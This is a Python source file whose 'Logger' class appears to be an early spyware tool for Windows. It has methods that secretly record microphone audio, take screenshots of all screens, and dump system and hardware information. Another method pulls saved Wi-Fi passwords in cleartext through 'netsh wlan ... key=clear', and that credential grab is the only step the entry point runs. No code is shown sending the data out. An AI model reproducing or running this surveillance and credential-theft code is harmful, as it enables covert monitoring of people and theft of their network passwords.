from scipy.io.wavfile import write
from datetime import datetime
import sounddevice as sd
from PIL import ImageGrab
import subprocess
import logging
import re

class Logger:
    def __init__(self):
        pass

    def microphone(self):
        fs = 44100
        seconds = 20
        try:
            rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
        except sd.PortAudioError:
            pass
            # logging.error("sound recording device is disabled")
        else:
            write("rec.wav", fs, rec)

    def screenshot(self):
        screenshot = ImageGrab.grab(bbox=None, all_screens=True)
        screenshot.save(f"{self.datetime("%d.%m.%y - %H;%M;%S")}.jpeg")

    def get_sysinfo(self):
        with open("systeminfo.txt", "w") as file:
            output = self.execute_command("systeminfo")
            file.write(output)        

    def get_hardware_devices(self):
        classes = str(self.execute_command(args=["powershell", "Get-PnpDevice | Select-Object -Property Class | Sort-Object -Property Class | Get-Unique -AsString"])).strip().replace("\\n", "").split()
        with open("hardware_devices.txt", "w") as file:
            for class_ in classes[2:-2]:
                output = self.execute_command(["powershell", "Get-PnpDevice", "-Class", class_])
                file.write(output)

    def get_WiFi_password(self):
        # networks = {}
        command = self.execute_command("netsh wlan show profile").split("\n")
        profiles = [i.split(":")[1][1:] for i in command if "All User Profile" in i]
        for network in profiles:
            nw = self.execute_command(f"netsh wlan show profile {network} key=clear").split("\n")
            password = [i.split(":")[1][1:-1] for i in nw if "Key Content" in i][0]
            # networks[network] = password
                        
        # with open("WiFi_passwords.txt", "w") as file:
        #     file.write()

    def execute_command(self, args: str | list):
        command = subprocess.Popen(args=args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8")
        output, error = command.communicate()
        if command.returncode == 0: 
            return output 
        else: logging.error(error)

    def datetime(self, format):
        return datetime.now().strftime(format)

    def __call__(self):
        # self.get_sysinfo()
        # self.screenshot()
        self.get_WiFi_password()
        # self.microphone()
        # self.get_hardware_devices()